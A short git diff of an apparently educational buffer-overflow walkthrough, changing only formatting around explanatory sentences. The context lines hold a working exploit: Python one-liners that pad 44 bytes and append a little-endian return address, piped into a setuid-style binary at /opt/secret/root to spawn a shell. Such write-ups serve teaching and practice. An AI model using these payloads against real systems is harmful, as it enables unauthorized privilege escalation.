@@ -159,13 +159,12 @@ Method 2 - Struct:
 python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
 ```
 
-```python
-It requires importing a module but struct.pack allows us to automatically convert memory to little endian.
-```
 
-```python
+It requires importing a module but struct.pack allows us to automatically convert memory to little endian.
+
+
 We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary
-```
+
 
 ```python
 python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
